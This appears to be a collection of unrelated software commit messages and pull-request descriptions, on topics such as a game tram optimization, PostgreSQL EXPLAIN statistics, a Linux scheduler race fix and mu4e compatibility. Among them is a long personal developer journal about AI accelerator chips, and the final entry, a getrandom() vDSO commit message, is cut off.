(code bounty) The tram is now unstoppably powerful. it cannot be stopped, it cannot be slowed, it cannot be reasoned with. YOU HAVE NO IDEA HOW READY YOU ARE (#66657)

ever see the tram take 10 milliseconds per movement to move 2100 objects? now you have

About The Pull Request

fixes #66887

done for the code bounty posted by @MMMiracles to optimize the tram so that it can be sped up. the tram is now twice as fast, firing every tick instead of every 2 ticks. and is now around 10x cheaper to move. also adds support for multiz trams, as in trams that span multiple z levels.

the tram on master takes around 10-15 milliseconds per movement with nothing on it other than its starting contents. why is this? because the tram is the canary in the coal mines when it comes to movement code, which is normally expensive as fuck. the tram does way more work than it needs to, and even finds new ways to slow the game down. I'll walk you through a few of the dumber things the tram currently does and how i fixed them.

    the tram, at absolute minimum, has to move 55 separate industrial_lift platforms once per movement. this means that the tram has to unregister its entered/exited signals 55 times when "the tram" as a singular object is only entering 5 new turfs and exiting 5 old turfs every movement, this means that each of the 55 platforms calculates their own destination turfs and checks their contents every movement. The biggest single optimization in this pr was that I made the tram into a single 5x11 multitile object and made it only do entering/exiting checks on the 5 new and 5 old turfs in each movement.
    way too many of the default tram contents are expensive to move for something that has to move a lot. fun fact, did you know that the walls on the tram have opacity? do you know what opacity does for movables? it makes them recalculate static lighting every time they move. did you know that the tram, this entire time, was taking JUST as much time spamming SSlighting updates as it was spending time in SStramprocess? well it is! now it doesnt do that, the walls are transparent. also, every window and every grille on the tram had the atmos_sensitive element applied to them which then added connect_loc to them, causing them to update signals every movement. that is also dumb and i got rid of that with snowflake overrides. Now we must take care to not add things that sneakily register to Moved() or the moved signal to the roundstart tram, because that is dumb, and the relative utility of simulating objects that should normally shatter due to heat and conduct heat from the atmosphere is far less than the cost of moving them, for this one object.
    all tram contents physically Entered() and Exited() their destination and old turfs every movement, even though because they are on a tram they literally do not interact with the turf, the tram does. also, any objects that use connect_loc or connect_loc behalf that are on the same point on the tram also interact with each other because of this. now all contents of the tram act as if theyre being abstract_move()'d to their destination so that (almost) nothing thats in the destination turf or the exit turf can react to the event of "something laying on the tram is moving over you". the rare things that DO need to know what is physically entering or exiting their turf regardless of whether theyre interacting with the ground can register to the abstract entered and exited signals which are now always sent.
    many of the things hooked into Moved(), whether it be overrides of Moved() itself, or handlers for the moved signal, add up to a LOT of processing time. especially for humans. now ive gotten rid of a lot of it, mostly for the tram but also for normal movement. i made footsteps (a significant portion of human movement cost) not do any work if the human themselves didnt do the movement. i optimized has_gravity() a fair amount, and then realized that since everything on the tram isnt changing momentum, i didnt actually need to check gravity for the purposes of drifting (newtonian_move() was taking a significant portion of the cost of movement at some points along the development process). so now it simply doesnt call newtonian_move() for movements that dont represent a change in momentum (by default all movements do).

also i put effort into 1. better organizing tram/lift code so that most of it is inside of a dedicated modules folder instead of scattered around 5 generic folders and 2. moved a lot of behavior from lift platforms themselves into their lift_master_datum since ideally the platforms would just handle moving themselves, while any behavior involving the entire lift such as "move to destination" and "blow up" would be handled by the lift_master_datum.

multiz tram (this just adds the capability to map it like this, no tram does this)
Actual Performance Differences

to benchmark this, i added a world.Profile(PROFILER_START) and world.Profile(PROFILER_START) to the tram moving, so that it generates a profiler output of all tram movement without any unrelated procs being recorded (except for world.Profile() overhead). this made it a lot easier to quantify what was slowing down both the tram and movement in general. and i did 3 types of tests on both master and my branch.

also i should note that i sped up the "master" tram test to move once per tick as well, simply because the normal movement speed seems unbearably slow now. so all recorded videos are done at twice the speed of the real tram on master. this doesnt affect the main thing i was trying to measure: cost for each movement.

the first test was the base tram, containing only my player mob and the movables starting on the tram roundstart. on master, this takes around 13 milliseconds or so on my computer (which is pretty close to what it takes on the servers), on this branch, it takes between 0.9-1.3 milliseconds.

ALSO in these benchmarks youll see that tram/proc/travel() will vary significantly between the master and optimized branches. this is 100% because there are 55 times more platforms moving on master compared to the master branch, and thus 55x more calls to this proc. every test was recorded with the exact same amount of distance moved

here are the master and optimized benchmark text files:

also this shows the increased SSlighting usage resulting from the tram on master spamming updates, which doesnt happen on the optimized branch

the second test is meant to benchmark the best case scaling cost of moving objects, where nothing extra is registered to movement besides the bare minimum stuff on the /atom/movable level. Each of the open tiles of the tram had 1 bluespace rped filled with parts dumped onto it, to the point that the tram in total was moving 2100 objects. the vast majority of these objects did nothing special in movement so they serve as a good base case. only slightly off due to the rped's registering to movement.

on master, this test takes over 100 milliseconds per movement

when optimized, about 10 milliseconds per movement

optimization 2000 obj's.txt

the third test is 300 humans spawned onto the tram, meant to test all the shit added on to movement cost for humans/carbons. in retrospect this test is actually way too biased in favor of my optimizations since the humans are all in only 3 tiles, so all 100 humans on a tile are reacting to the other 99 humans movements, which wouldnt be as bad if they were distributed across 20 tiles like in the second test. so dont read into this one too hard.

on master, this test takes 200 milliseconds
master 300 catgirls.txt

when optimized, this takes about 13-14 milliseconds.
optimization 300 catgirls on ram ranch.txt
Why It's Good For The Game

the tram is literally 10x cheaper to move. and the code is better organized.
currently on master the tram is as fast as running speed, meaning it has no real relative utility compared to just running the tracks (except for the added safety of not having to risk being ran over by the tram). now the tram of which we have an entire map based around can be used to its full potential.

also, has some fixes to things on the tram reacting to movement. for example on master if you are standing on a tram tile that contains a banana and the TRAM moves, you will slip if the banana was in that spot before you (not if you were there first however). this is because the banana has no concept of relative movement, you and it are in the same reference frame but the banana, which failed highschool physics, believes you to have moved onto it and thus subjected you to the humiliation of an unjust slipping. now since tram contents that dont register to abstract entered/exited cannot know about other tram contents on the same tile during a movement, this cannot happen.

also, you no longer make footstep sounds when the tram moves you over a floor
TODO

mainly opened it now so i can create a stopping point and attend to my other now staling prs, we're at a state of functionality far enough to start testmerging it anyways.

add a better way for admins to be notified of the tram overloading the server if someone purposefully stuffs it with as much shit as they can, and for admins to clear said shit.
automatically slow down the tram if SStramprocess takes over like, 10 milliseconds complete. the tram still cant really check tick and yield without introducing logic holes, so making sure it doesnt take half of the tick every tick is important
go over my code to catch dumb shit i forgot about, there always is for these kinds of refactors because im very messy
remove the area based forced_gravity optimization its not worth figuring out why it doesnt work
fix the inevitable merge conflict with master lol
create an icon for the tram_tunnel area type i made so that objects on the tram dont have to enter and exit areas twice in a cross-station traversal

    add an easy way to vv tram lethality for mobs/things being hit by it. its an easy target in another thing i already wanted to do: a reinforced concept of shared variables from any particular tram platform and the entire tram itself. admins should be able to slow down the tram by vv'ing one platform and have it apply to the entire tram for example.

Changelog

cl
balance: the tram is now twice as fast, pray it doesnt get any faster (it cant without raising world fps)
performance: the tram is now about 10 times cheaper to move for the server
add: mappers can now create trams with multiple z levels
code: industrial_lift's now have more of their behavior pertaining to "the entire lift" being handled by their lift_master_datum as opposed to belonging to a random platform on the lift.

Showing applied extended statistics in explain

Hi,

With extended statistics it may not be immediately obvious if they were
applied and to which clauses. If you have multiple extended statistics,
we may also apply them in different order, etc. And with expressions,
there's also the question of matching expressions to the statistics.

So it seems useful to include this into in the explain plan - show which
statistics were applied, in which order. Attached is an early PoC patch
doing that in VERBOSE mode. I'll add it to the next CF.

A simple example demonstrating the idea:

======================================================================

  create table t (a int, b int);
  insert into t select mod(i,10), mod(i,10)
    from generate_series(1,100000) s(i);

  create statistics s on a, b from t;
  analyze t;

test=# explain (verbose) select * from t where a = 1 and b = 1;
                          QUERY PLAN
---------------------------------------------------------------
 Seq Scan on public.t  (cost=0.00..1943.00 rows=10040 width=8)
   Output: a, b
   Filter: ((t.a = 1) AND (t.b = 1))
   Statistics: public.s  Clauses: ((a = 1) AND (b = 1))
(4 rows)

test=# explain (verbose) select 1 from t group by a, b;
                              QUERY PLAN
----------------------------------------------------------------------
 HashAggregate  (cost=1943.00..1943.10 rows=10 width=12)
   Output: 1, a, b
   Group Key: t.a, t.b
   ->  Seq Scan on public.t  (cost=0.00..1443.00 rows=100000 width=8)
         Output: a, b
         Statistics: public.s  Clauses: (a AND b)
(6 rows)

======================================================================

The current implementation is a bit ugly PoC, with a couple annoying
issues that need to be solved:

1) The information is stashed in multiple lists added to a Plan. Maybe
there's a better place, and maybe we need to invent a better way to
track the info (a new node stashed in a single List).

2) The deparsing is modeled (i.e. copied) from how we deal with index
quals, but it's having issues with nested OR clauses, because there are
nested RestrictInfo nodes and the deparsing does not expect that.

3) It does not work for functional dependencies, because we effectively
"merge" all functional dependencies and apply the entries. Not sure how
to display this, but I think it should show the individual dependencies
actually applied.

4) The info is collected always, but I guess we should do that only when
in explain mode. Not sure how expensive it is.

5) It includes just statistics name + clauses, but maybe we should
include additional info (e.g estimate for that combination of clauses).

6) The clauses in the grouping query are transformed to AND list, which
is wrong. This is easy to fix, I was lazy to do that in a PoC patch.

7) It does not show statistics for individual expressions. I suppose
examine_variable could add it to the rel somehow, and maybe we could do
that with index expressions too?

feat: added custom markup preprocessor; P.S. I'm an idiot

My god, I forgot the most critical thing. I've been writing these
custom preprocessors without even realizing I wasn't returning the code
they were processing, so the output bundle still was just the source.

I honestly don't know if this was the root of all my recent issues, but
surely nothing I did was going to work either way.

INDI Devices Handling Refactor

This is a major refactor for how KStars handles INDI devices. Traditionally, Ekos would create devices as soon as they are received. Each device is assigned a specific device type based on *signature* properties that belong to that device class. For example, EQUATORIAL_EOD_COORD would indicate that the device is a mount, and so forth. While this scheme worked well for most simple devices, it became complex to handle INDI devices with multiple interfaces (e.g. CCD with Filter wheel built in).

These kind of devices were supported by retaining them as GenericDevices and then sending general INDI commands to them when needed. Using this, we were able to support most multi-interface devices for many years in KStars. However, with even more complex devices that are not conventional (e.g. Dome with weather station interface), it became very complicated to handle such devices effectively without ugly hacks.

This MR introduces an update method for dealing with INDI devices:
1. All devices are created as _GenericDevices_
2. Based on device DriverInterface property, we create _ConcreteDevices_ accordingly. A concrete device is derived from each supported INDI device interface (i.e. Guider, Focuser, Correlator, ...etc)
3. ConcreteDevices are only announced when READY. This is in contrast to previous behavior when devices were announced as soon as a _signature_ property is detected. We determine if a device ready by monitoring the flow of defined properties using a timer. This results in highly simplified method for dealing with device properties.

Lots of testing is required now to ensure the new scheme works.

Update ImageBackground.js (#32055)

Summary:
Currently ImageBackGround component has optional style props, but if you don't pass it as prop, it still "thinks" you pass style and crushes.
In this pr, I made width and height inside component to be optional so it won't crush.

## Changelog

[General] [Fix] - Changed ImageBackground's style so it won't crush.

[Screen Shot 2021-08-20 at 15 05 45](https://user-images.githubusercontent.com/62840630/130230568-be02b1a2-52ec-4f9d-b3d3-212552d3882b.png)

As you can see in this component, I tried to use ImageBackground without any style props, and my app crushes. Then I added style with empty object and the app didn't crush anymore, as you can see here:
![Screen Shot 2021-08-20 at 15 09 23](https://user-images.githubusercontent.com/62840630/130230932-a576c397-a910-4e40-a202-56482d83dd9c.png).

In conclusion, if we make width and height styles optionals inside ImageBackground component, it won't crush anymore.

Thoughts:
Maybe consider to make style props for this component none-optional because it isn't make any sense that image won't have any style at all.

Thanks ahead, that was my first pr, Eden Binyamin.

[SPARK-39869][SQL][TESTS] Fix flaky hive - slow tests because of out-of-memory

### What changes were proposed in this pull request?

This PR adds some manual `System.gc`. I know enough that this doesn't guarantee the garbage collection and sounds somewhat funny but it works in my experience so far, and I did such hack in some places before.

### Why are the changes needed?

To deflake the tests.

### Does this PR introduce _any_ user-facing change?

No, dev and test-only.

### How was this patch tested?

CI in this PR should test it out.

Closes #37291 from HyukjinKwon/SPARK-39869.

No continuing lines. While that does improve performance, it kinda looks ugly. Even with formatting, it's just kinda ass, and therefore not worth it. Especially considering that it's instant anyway; Now my guis are either hotifexisted or hotifactived, the previous issue I wanted to solve with global hotkeys is so when I closed a gui, it wouldn't activate a strange window. This issue doesn't seem to happen anymore, and if it does, it's worth it for what I now get; The guis are neither always active, nor NA. Meaning, I can use as many at once as I want. I can get the keycodes of the entire alphabet if I so wanted, while getting the info for all active windows and multiple coordinates (although I'm not sure how I'd remember which one is which). Now there's no 'rush' to actually using the info I'm getting, which is a big plus. Better yet, it's now more usable to other people, if we ignore the dependencies

sched/core: Fix ttwu() race

Paul reported rcutorture occasionally hitting a NULL deref:

  sched_ttwu_pending()
    ttwu_do_wakeup()
      check_preempt_curr() := check_preempt_wakeup()
        find_matching_se()
          is_same_group()
            if (se->cfs_rq == pse->cfs_rq) <-- *BOOM*

Debugging showed that this only appears to happen when we take the new
code-path from commit:

  2ebb17717550 ("sched/core: Offload wakee task activation if it the wakee is descheduling")

and only when @cpu == smp_processor_id(). Something which should not
be possible, because p->on_cpu can only be true for remote tasks.
Similarly, without the new code-path from commit:

  c6e7bd7afaeb ("sched/core: Optimize ttwu() spinning on p->on_cpu")

this would've unconditionally hit:

  smp_cond_load_acquire(&p->on_cpu, !VAL);

and if: 'cpu == smp_processor_id() && p->on_cpu' is possible, this
would result in an instant live-lock (with IRQs disabled), something
that hasn't been reported.

The NULL deref can be explained however if the task_cpu(p) load at the
beginning of try_to_wake_up() returns an old value, and this old value
happens to be smp_processor_id(). Further assume that the p->on_cpu
load accurately returns 1, it really is still running, just not here.

Then, when we enqueue the task locally, we can crash in exactly the
observed manner because p->se.cfs_rq != rq->cfs_rq, because p's cfs_rq
is from the wrong CPU, therefore we'll iterate into the non-existant
parents and NULL deref.

The closest semi-plausible scenario I've managed to contrive is
somewhat elaborate (then again, actual reproduction takes many CPU
hours of rcutorture, so it can't be anything obvious):

					X->cpu = 1
					rq(1)->curr = X

	CPU0				CPU1				CPU2

					// switch away from X
					LOCK rq(1)->lock
					smp_mb__after_spinlock
					dequeue_task(X)
					  X->on_rq = 9
					switch_to(Z)
					  X->on_cpu = 0
					UNLOCK rq(1)->lock

									// migrate X to cpu 0
									LOCK rq(1)->lock
									dequeue_task(X)
									set_task_cpu(X, 0)
									  X->cpu = 0
									UNLOCK rq(1)->lock

									LOCK rq(0)->lock
									enqueue_task(X)
									  X->on_rq = 1
									UNLOCK rq(0)->lock

	// switch to X
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	switch_to(X)
	  X->on_cpu = 1
	UNLOCK rq(0)->lock

	// X goes sleep
	X->state = TASK_UNINTERRUPTIBLE
	smp_mb();			// wake X
					ttwu()
					  LOCK X->pi_lock
					  smp_mb__after_spinlock

					  if (p->state)

					  cpu = X->cpu; // =? 1

					  smp_rmb()

	// X calls schedule()
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	dequeue_task(X)
	  X->on_rq = 0

					  if (p->on_rq)

					  smp_rmb();

					  if (p->on_cpu && ttwu_queue_wakelist(..)) [*]

					  smp_cond_load_acquire(&p->on_cpu, !VAL)

					  cpu = select_task_rq(X, X->wake_cpu, ...)
					  if (X->cpu != cpu)
	switch_to(Y)
	  X->on_cpu = 0
	UNLOCK rq(0)->lock

However I'm having trouble convincing myself that's actually possible
on x86_64 -- after all, every LOCK implies an smp_mb() there, so if ttwu
observes ->state != RUNNING, it must also observe ->cpu != 1.

(Most of the previous ttwu() races were found on very large PowerPC)

Nevertheless, this fully explains the observed failure case.

Fix it by ordering the task_cpu(p) load after the p->on_cpu load,
which is easy since nothing actually uses @cpu before this.

Add an install script.

Traditionally I had my conf directly as a .git in $HOME. This
is inconvenient for a number of reasons ; a big one is, my
entire $HOME becomes a git repo so commands like `git status`
will do something anywhere under my home, when it's usually
not relevant (e.g. `git status` outside of a git repo should
give an error, not give me a status for an unrelated repo,
it's confusing). Also $HOME is full of stuff not managed in
the git so `git status` would show hundreds of unrelated
files that I'd ignore every time.

Now that's pretty stupid, but I never got arount to fixing
it on my home machine, though on newer installs I've taken
to put the git is some subdir and symlinking to the git-
managed files, which is a lot more sane.

But now I find that for some tools, $HOME/.xkb is actually
special. For example, this is preventing the kwin tests
from running, because they try to find a definition for a
us keyboard with pc104 in ~/.xkb when it's not meant for
that at all. Or maybe it was a long time ago, but I'm
pretty sure it no longer is. We'll see if anything breaks...

Now with this fixed and out of the way, it's important to
remember to not just ln -s everything from this dir to
$HOME. Obviously .git, but also en_JP and its readme which
have nothing to do in $HOME, and .xkb which is not meant
for that. In fact it will be renamed in the next patch,
since it should not start with a dot.

The best and most automatic way to do this is to have a
script to manage the correct files to link, so this patch
does that. I hope I won't forget to update the script next
time I put some new dot file that I want to manage in here.

I modified the PHP code of the file "Cover Images Folder Definer.php".
I made that to define the cover folders so I can use the folder without language if the story has the same name in the two languages.
I modified the language item definition, removing the word "Brasileiro" from all of the items that were in Portuguese.
Like story chapter folders, and story cover folders.

Added these 6 new colors to "Colors.css":
salmon
dark-salmon
darker-salmon
light-salmon
second-purple
second-dark-purple

I modified the colors and visual style of the website "The Life of Littletato", modifying the colors to pink salmon, and purple.

Fixed the "add videos to My Little Pony: Friendship Is Magic video div" JQuery on its website.
The videos were not being added to the mobile version of the website.
I modified the friends' list and the website image size.
Also modified the website's folder to "My Little Pony/Friendship Is Magic".

#### Monday 2022-08-01 09:29:43 by Marko Grdinić

"7:40am. If I can't or don't want to write, I will do freelancing. I can't help it that I won't get paid much doing that, but it would beat doing anything else. I simply lack proper determination to get a job. A real job seeker would not be afraid of standing a while in some company. Zenna, Viktor and now Nicole. I simply can't stop talking about AI chips with people who shouldn't have anything to do with it. I think now it should be obvious even to myself how deep the obsession runs now. I couldn't find Groq's cloud offering, some cloud provider called Nimbix that offers private services supposedly offers its chips, but I have applied for Graphcore and Tenstorrent's cloud. I do not have much desire to program them, but given how obsessed I am about it, who knows how things will go.

I am really unlucky to live on the edge like this. If I could have made even 5$ a month from poker botting things would have been so much different.

I think maybe if I could try out Graphcore and Tenstorrent's chips, and they turn out to be disappointments, that would relieve me of my obsession. But if I get something like 100x hands per hour compared to the  GPU setup, that will fire me up all over again and I will return to my old path, and this time do it correctly. I'll do the simulator thing where instead of having the net learn to handread as well as play the game, I will just have it learn to play using pre-learned features.

There are things I could have done to make things go better, that do not necessarily have anything with the learning algorithm itself.

7:55am. Poker botting was a means to an end. Doing it on CPU + GPUs means nothing to me by itself. Doing it without the use of ML would not be meaningful. I picked that path to specifically cultivate my ML skills.

I am not saying that I will do the above or that I want to do it. But that is what I think will happen simply due to how deep this insanity runs in me.

8am. Yeah, it runs really deep. I keep saying I'll trick those dumb HR drones, but this whole time I've essentially been applying to the AI chip job despite my stated wishes of wanting money. Remember when I got that surprise sponsorship offer by Strong Compute. Those were really desperate for a ML guy, but Spiral itself is not my weak point. If they had bullshit something like 'Sure, we are interested in AI chips. But they are hard to get right now. We'd make it a priority to switch to them once they arrive, but for now how do you feel about using vanilla hardware?'

If they had told me something like that, then I do not know what would have happened. What sort of crazy thing would my obsession have me do?

Despite how obsessed I am, I am not sure I'd want a job at the AI chip companies. I want work actually using them. It is kind of like the difference between being a soldier and a gun manufacturer, or a swordsman and smith.

It is true that I applied to some of them last year, but me and jobs do not exactly have a sane, sensible relationship. I seem to be completely clueless as to what my own motivations are.

I guess now that I've actually gone to a few intro interviews, and understand that HR drones prioritize gauging interest, it revealed something to me. Maybe I did gain something from this attempt. In the last year's round of applications, I never went beyond being given HackerRank shit from the 10% of the drones that did not chuck my resume into the basket, but at place at Kalepa I was allowed to skip that stage and go forward to having a talk with recruiters.

8:15am. My reasoning is that I should want money for all sorts of good things. It is simply a sane way of looking at it. It is how a sensible person would do it. I told myself that is what I want. But I guess before I can trick the recruiters, I should first work on tricking myself.

8:20am. Hmmm, maybe I have been obsessed from the start. I mean, the reason why I created Spiral was so I could serve as a language for AI chips. This motivation goes years back. I never believed in CPUs and GPUs from the start. Ever since I wrote Simulacrum I've had a desire to grasp the brain cores and extract their power. For me a language is just a tool that would allow me to do it. So I prioritized making a language and told myself that I'll make money via poker to make up for it. This later thing was merely a goalpost, not the actual reason for making the language.

8:25am. Before recently, the cloud was not in my eyes, but now that I've come to understand that it is my only choice of scaling - and thank to my RL/3d experience, I realized that I really hate doing training runs on my own rig, so it sparked that desire.

I got my ass handed to me so hard in late 2021, so it is late to realize that it exists, but it better than never.

Right now, I am not really looking forward to trying out Graphcore's chips. I don't really believe in the current generation of such devices. But do I really believe that once I get access, that I won't be studying the manual looking into how to program them?

What I am most afraid of currently?

It is not really that their performance might be poor. Rather I am afrain that their programability might not be high enough. For my plan to bear fruit I want to move the simulation code to the chip. If they end up being dumb ML accelerators rather than a paradigm shift in how computing is done, it will be hard to accomplish my goals.

8:35am. The reason I believe that is because will AI simply come about through the use of PyTorch. That can't be true. In the first place, you can only use deep learning libraries to do deep learning. This incredibly restricts your research scope and it is obvious that backprop cannot handle actual intelligence. So all the ML researchers focusing on it are just adding to the landfil of useless papers.

Tenstorrent says they are not a deep learning chip, but I won't believe these companies until I can try out their chips and see the programming model they are using for myself. I am feeling very skeptical of them.

8:45am. Yeah...I want a job in a company focusing on making use of AI chips. I do not care about the salary because I know that through the use of advanced AIs it will be easy to make tens of millions of dollars. This is why I can't get on board with accumulating wages and investing them.

In the review I wrote yesterday, I said that I was unsure of whether I'd be able to do the tasks at some random company despite my skills? Looking into myself it does not really feel that way when I think about programming AI chips. I've never touched them yet and have no experience with them, but I could confidently that absolutely nothing will stop me from accomplishing any given task once I have them.

If I felt that way about programming the CPU, I'd have a much easier time getting a job.

9am. I've just been confused...I think had proper ways of getting AI chips were there I'd have realized what my true desire way.

Imagine I had several job offers before me, 1 was to program an AI chip for some task, and one of the other was 200k for some business analytics applciation which I do not care about. I'd pick the later, and then delay the decision, and lose sleep, and lose sleep, and lose sleep. I'd keep thinking of how that first company is enthusiastic about trying out new hardware for the sake of ML research. I'd probably cave in, in the end.

9:05am. No, this is not about desire or wanting something. How long have I worked on Spiral for example? Was I having fun every step of the way? No, it was hard and difficult instead. Yet, I kept going for some reason.

That reason can only be called obsession. Desires come and go.

9:10am. I am wrong. I though that as I got older, I've matured, become hardworking and found my goals, but that is not it.

When I did the hard work of the past 7.5 years, and challenged the hardship, I thought that it was maturity, but that is not it. Old people are often useless and have long lost their drive. When I did what I didn't want to do, it was not because I've gone beyond being a child, but precisely because I was a child.

My deep obsession towards my path is what kept me going. It overruled all the minor pains and objections.

9:25am. Going back to the 50k ai chip vs 200k business analytics job. I need to understand that what I desire is ease and money. What I want is the later. But what I am obsessed about is the former. I'll only be able to make progress once I acknowledge this obsession. I should find a way to work with it. I should also come to term with my arrogance. I'd loathe doing favors to randos for low reward which is what freelancing is.

9:35am. I am obsessed...and since last year, I've lost the proper outlet for that obsession.

9:40am. Apart from doing the C backend, last month really sucked. But I did a good thing by getting my accounts in order.

I think I do want to program. I was wounded and art gave me an outlet, but now...

9:45am. Yeah, obsession is different from desire and I need to accept and work with it. Money is secondary.

What I want to do now is make sure of the programming models for the AI chips.

There is no way around it. I need to check whether I could implement a poker game or a genetic programming system, on the Graphcore IPU or the TensTorrent chip. Once I have that I will know here the path points to. If it turns out the chips can do what I want, then that means the jobs involving them would be far more attractive to me.

Though neuromorphic, the requirements of an AI chip and the brain are different. The brain was designed by nature and already has algorithms built into it. But what I'd want in an AI chip is the capability for to program it so it can infer it own algorithm.

This should be possible if they are just localized CPUs + GPUs. If they are something like Intel's Loihi, then it would not be possible at all.

It is the same situation as airplanes vs birds. There are different paths towards getting to the same capability.

I need to look at it from the future, and consider the case - what if intelligence is in fact easy to do? Easy in the same was as getting a car is easy if you have the money to buy it. If you don't then all you can do is stare at them in the lot. Right now, I and the rest of the community might be in the later position. The impression given is that getting a car is really hard, and you need to do all sorts of weird things to get halfway the transporation capability using other devices.

9:55am. Being able to infer your own algorithm is important for not just achieving parity with the brain, but exceeding it. Who is to say that there is some optimal data transformation for processing the widest array of inputs.

10:10am. ...Damn it, let me check something out. When I registered for Graphcore cloud, they sent me some links to the SDK. Let me spend some time looking at it.

https://docs.graphcore.ai/en/latest/?utm_campaign=Graphcloud%20Announcement%20&utm_medium=email&_hsmi=108027897&_hsenc=p2ANqtz--4LI3qlJ_iAh2kvypjWdaJ6UdhBMFEsbhBZYTw5U1tYuK7LrFioi_5OHs6h5sZdOaEwwp5ZoI7coXhfe3kzI2Es7rwHw&utm_content=108027897&utm_source=hs_automation

https://groq.com/docs/

Groq has docs. If I really want a job programming these chips, there will be people in public places who I will be able to impress using my obsession. Getting a job should just involve showing sincerity to the right person.

10:15am. Let me read the year of the compiler at Groq. Does TensTorrent really not have any programming guides?

https://tenstorrent.com/faq/
> Documentation and reference designs can be found at docs.tenstorrent.com. Documentation includes User Guide or Quick Start Guide, datasheets, API guide, reference designs, errata, and changelogs.

Google is so useless. Why didn't it link me to the docs directly?

https://docs.tenstorrent.com/tenstorrent/

Let me read some of the stuff here. There is not much. It will be possible to program these things directly right?

https://docs.tenstorrent.com/tenstorrent/tenstorrent-pcie-cards/getting-started/sample-app/sample-app-explained

Don't they have any more impressive examples than this?

https://docs.tenstorrent.com/tenstorrent/tenstorrent-devcloud/getting-started/tether-details

> Tether is Tenstorrent's custom run-time tool which can be used to compile and run models on Tenstorrent hardware and feed data into the PCIe card and pull results out. In this release, Tether supports PyTorch and ONNX models as inputs. The release provides many sample models to test functionality.

This is really making me flacid. Who cares about running PyTorch models. Where is the programming guide?

> What ML frameworks are supported by your hardware?
> We have focused our efforts on Pytorch for now, but are capable of interfacing to other frameworks via ONNX. We also have a low-level C++ based programming framework called BUDA, and are able to run computations on NumPy arrays.

> How do I get started?

There is an email here. Right. This is the way to show sincerity...except the link is asking me for a password. It is not an email.

> Where do I find support if I need help?
> Support can come in two different ways.  You can navigate to the Tenstorrent Discord channel for community-driven support or you can email us at support@tenstorrent.com for individual-specific questions.

If I can't find the dev cloud using Google, maybe the support will tell me. Yeah, this is a path towards getting what I want. What I am feeling now is going to that discord channel and showing the people there Spiral. Remember when I made those posts on Reddit? I simply wasn't looking hard enough back then.

10:50am. Going through the application process make it seem like getting an in is a binary thing, but real world accumulation is more like a gradual process.

11am. I need to be putting myself out there.

Yeah, I need to give this a try. If those people turn out to be interested in a PL expert and a FPL like Spiral, then that is great. But in order to satisfy this obsession of my rather than letting it linger and fester in my heart, I should study the programming models of these AI chips and determine whether they would be suitable for implementing what I had in mind. If it turns out that it is not the case, then I might as well go into writing, freelancing and whatever else. But if they are suitable I'll aim to get a job programming them.

This was actually the plan in early 2021, but then I got into poker botting. Afterwards I somehow forgot about it, or rather none of the public job postings appealed to me. I really need to speak to somebody in the field to ask whether the kinds of roles that I'd like exist. Going through the official channels is a roulette, but the unofficial ones are where I can direct where I could land.

11:05am. I do not necessarily care about selling people on Spiral. A thoughtful reject would give me valuable feedback. Because it is not like I want to do all this. I am not attached to Spiral to the point of loving it. It is just that I am obsessed about it.

11:10am. What I want is to get out of my current dark spot. If I had a concrete plan for how I could use these chips and knew what sort of programs were viable on them, that would illuminate the way forward for me as a programmer. Maybe the chips will turn out weak and my obsession will loosen its hold on me.

https://docs.tenstorrent.com/tenstorrent/learn-more/support

Oh, here is the support. It has the link to the Discord channel. Let me take a little break to mentally prep myself and then I'll get started.

11:20am. In fact, let me hold off for more than just a bit, so I can put the crazy posts of the last few days a bit down the tree where they won't be so visible. I can take some time to write today while I scheme on the side. Also, I've decided that I won't post the review on the PL sub thread. That is not what I need to do.

There was a sense of being lost, but as I said once, these chips will have a community around them. Customers will need people to program them, and not all of them will necessarily want PyTorch model jockeys. Now that I've decided that I want a particular role rather than to maximize my salary, that will allow me to put my all into social interaction. If I can be sincere, I can bring this to a conclussion. I need to find a way of making connections. Applying to companies on job boards is not the way to do this."

fix(mu4e): support mu 1.8

Thanks to some combination of ignorance and obstinance, mu4e has thrown
compatibility to the wind and completely ignored the exitance of
define-obsolete-function-alias. Coupled with the inconsistent/partial
function renaming, this has made the mu4e 1.6⟶1.8 change particularly
annoying to deal with.

By suffering the pain of doing the mu4e author's work for them, we can
use defalias to give backwards compatibility a good shot for about 60
functions. Some mu4e~x functions are now mu4e--x, others are unchanged,
and then you've got a few odd changes like mu4e~proc -> mu4e--server and
mu4e-search-rerun. The form of message :from entries has also changed,
and a new (mu4e) entrypoint added supplanting mu4e~start.

Fix: #6511
Close: #6549

WLTs and Shrapnel

[Added]
- Generic WLTs
- Legion-specific WLT placeholders
- WLT SEG added to generics (Praetors, Centurion)
- Graviton and Shrapnel weapons to all relevant models (I'm dead inside after needing to handle such needlessly picky formatting from GW)
- To facilitate Shrapnel Pistols, I added a Bolt Pistol Options SEG to several generic units

[Changed]
- Master of the Legion; now a separate SE that checks for 1 instance per 1k pts
- Added MotL to all relevant characters
- Mandatory generic WLTs handled as links to single WLT rather than SEG (Only done for IW characters, but can easily be duplicated for others)
- Mandatory non-generic WLTs only constrained by Min/Max 1 Warlord (didn't think it was relevant to make their specific WLTs also constrained as only one Warlord can be chosen at a time afaik)
- Reformatted Palatine Blades to fit Tactical template (Min X, decrement X, repeat X for models)
- Reformatted Centurion weapon options to cut down on clutter and bring in line with recent discussions/other entries
- Some fairly serious changes to Veterans to force checks on TLC and basic unit choice. I might honestly suggest formatting them more like Termies; as much I hate how clunky it is, there does not seem to be another way to force model integrity. The other option is completely ignoring the book's format and formatting it the way Recon Squads and several others currently are; please advise.

Pretty sure I missed some Shrapnel/Graviton options in some places, but I'm very tired and can deal with them when someone points them out.

random: implement getrandom() in vDSO

Two statements:

  1) Userspace wants faster cryptographically secure random numbers of
     arbitrary size, big or small.

  2) Userspace is currently unable to safely roll its own RNG with the
     same security profile as getrandom().

Statement (1) has been debated for years, with arguments ranging from
"we need faster cryptographically secure card shuffling!" to "the only
things that actually need good randomness are keys, which are few and
far between" to "actually, TLS CBC nonces are frequent" and so on. I
don't intend to wade into that debate substantially, except to note that
recently glibc added arc4random(), whose goal is to return a
cryptographically secure uint32_t. So here we are.

Statement (2) is more interesting. The kernel is the nexus of all
entropic inputs that influence the RNG. It is in the best position, and
probably the only position, to decide anything at all about the current
state of the RNG and of its entropy. One of the things it uniquely knows
about is when reseeding is necessary.

For example, when a virtual machine is forked, restored, or duplicated,
it's imparative that the RNG doesn't generate the same outputs. For this
reason, there's a small protocol between hypervisors and the kernel that
indicates this has happened, alongside some ID, which the RNG uses to
immediately reseed, so as not to return the same numbers. Were userspace
